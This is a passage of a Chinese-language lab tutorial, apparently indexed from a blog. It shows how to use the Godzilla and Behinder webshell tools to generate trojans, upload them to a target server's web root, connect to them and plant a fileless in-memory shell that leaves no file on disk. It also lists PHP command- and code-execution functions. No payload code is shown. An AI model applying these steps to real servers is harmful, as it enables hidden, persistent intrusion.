+4、哥斯拉管理webshell以及上传内存马①在攻击机使用哥斯拉生成木马
+选择java，并生成到桌面
+
+
+②将shell复制到靶机的www目录下
+③哥斯拉连接木马添加目标
+
+url选择上传文件落地的地址，有效载荷选择和木马一样的
+
+测试连接，成功则进行添加
+
+进去看看，右键，进入
+里面有相当多的功能
+
+接着生成内存马，选择memoryshell板块，设置文件名，不要后缀
+
+生成成功后去进行连接，还是和上传的shell设置一样
+
+
+并且内存马是活动在内存，并不会落地到磁盘，除非使用特定的内存管理工具才能看见
+
+靶机目录没有落地文件
+5、冰蝎webshell管理工具生成木马，先点击传输协议，再选择你想用的协议，然后生成服务端，则会生成木马文件
+
+木马文件默认未shell名字，可以自己更改
+
+然后将木马文件上传到靶机服务器网站根目录下
+
+最后进行连接
+
+然后双击进入
+
+成功
+扩展php语言中命令执行和代码执行的函数命令执行函数
+exec()：命令输出的最后一行，完整输出可存入 $output 数组，需要手动处理输出数组
+
+shell_exec()：完整的命令输出字符串
+
+system()：命令输出的最后一行，并直接打印结果，直接输出结果，并可获取状态码
+
+passthru()：无返回值，直接输出原始命令结果（如二进制数据）
+
+
+代码执行函数
+eval()：执行字符串中的PHP代码，返回NULL或代码中的返回值，可执行任意PHP代码
+assert()：判断断言是否为false，执行字符串代码	也可执行字符串代码
+preg_replace()：执行替换后的字符串（当使用&#x2F;e修饰符时）
+create_function()：创建一个匿名函数
+
+]]></content>
+  </entry>
+</search>
